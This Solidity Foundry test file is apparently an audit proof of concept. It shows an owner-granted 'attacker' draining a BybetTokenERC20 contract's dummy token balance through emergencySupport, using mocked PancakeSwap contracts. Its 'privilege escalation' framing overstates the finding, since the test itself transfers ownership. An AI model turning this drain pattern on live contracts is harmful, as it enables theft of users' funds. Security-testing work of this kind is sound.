// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BybetTokenERC20.sol";

contract PrivilegeEscalationTest is Test {
    BybetTokenERC20 public token;
    address public owner;
    address public attacker;
    address public victimToken;
    uint256 constant INITIAL_BALANCE = 100 ether;

    // Hardcoded addresses from token contract
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant FACTORY = address(0xabcd);

    function setUp() public {
        owner = address(this);
        attacker = address(0x1);
        victimToken = address(new DummyERC20());
        
        // Deploy mock contracts
        MockRouter mockRouter = new MockRouter();
        MockFactory mockFactory = new MockFactory();
        
        // Mock router and factory at required addresses
        vm.etch(ROUTER, address(mockRouter).code);
        vm.etch(FACTORY, address(mockFactory).code);
        
        // Deploy main token contract - mocks will be used internally
        token = new BybetTokenERC20();
        
        // Fund contract with vulnerable assets
        DummyERC20(victimToken).mint(address(token), INITIAL_BALANCE);
    }

    function test_privilegeEscalation() public {
        // Transfer ownership to attacker
        token.transferOwnership(attacker);
        
        // Confirm attacker is now owner
        assertEq(token.owner(), attacker, "Attacker should be owner");

        console.log("--- BEFORE-Trigger Support ---");
        uint256 contractBalanceBefore = DummyERC20(victimToken).balanceOf(address(token));
        uint256 attackerBalanceBefore = DummyERC20(victimToken).balanceOf(attacker);
        console.log("Contract Balance (Before):", contractBalanceBefore);
        console.log("Attacker Balance (Before):", attackerBalanceBefore);
        assertEq(contractBalanceBefore, INITIAL_BALANCE, "Contract should hold victim tokens");
        assertEq(attackerBalanceBefore, 0, "Attacker should start with zero balance");

        console.log("--- Trigger Support ---");
        // Attacker steals victim tokens using privileged function
        vm.prank(attacker);
        token.emergencySupport(victimToken, attacker, INITIAL_BALANCE);

        console.log("--- AFTER-Trigger Support ---");
        uint256 contractBalanceAfter = DummyERC20(victimToken).balanceOf(address(token));
        uint256 attackerBalanceAfter = DummyERC20(victimToken).balanceOf(attacker);
        console.log("Contract Balance (After):", contractBalanceAfter);
        console.log("Attacker Balance (After):", attackerBalanceAfter);

        // Check differential state changes
        uint256 contractDiff = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerDiff = attackerBalanceAfter - attackerBalanceBefore;
        bool tokenTheft = (contractDiff == INITIAL_BALANCE) && 
                          (attackerDiff == INITIAL_BALANCE) &&
                          (contractBalanceAfter == 0);

        // Existing post-attack assertions
        assertEq(attackerBalanceAfter, INITIAL_BALANCE, "Attacker should have stolen tokens");
        assertEq(contractBalanceAfter, 0, "Contract should be drained");

        // Final vulnerability verdict
        if (tokenTheft) {
            console.log("Vulnerability Exists: Attacker successfully transferred contract funds to themselves");
        } else {
            console.log("Vulnerability not Exist: No unexpected token transfer detected");
        }
    }
}

// Mock PancakeSwap Router
contract MockRouter {
    function factory() external pure returns (address) {
        return address(0xabcd);
    }
    
    function WETH() external pure returns (address) {
        return address(0xcafe); // Mock ETH
    }
}

// Mock PancakeSwap Factory
contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0xbeef); // Mock LP pair
    }
}

// ERC20 token for testing
contract DummyERC20 {
    mapping(address => uint) public balanceOf;
    
    function mint(address to, uint amount) public {
        balanceOf[to] += amount;
    }
    
    function transfer(address to, uint amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}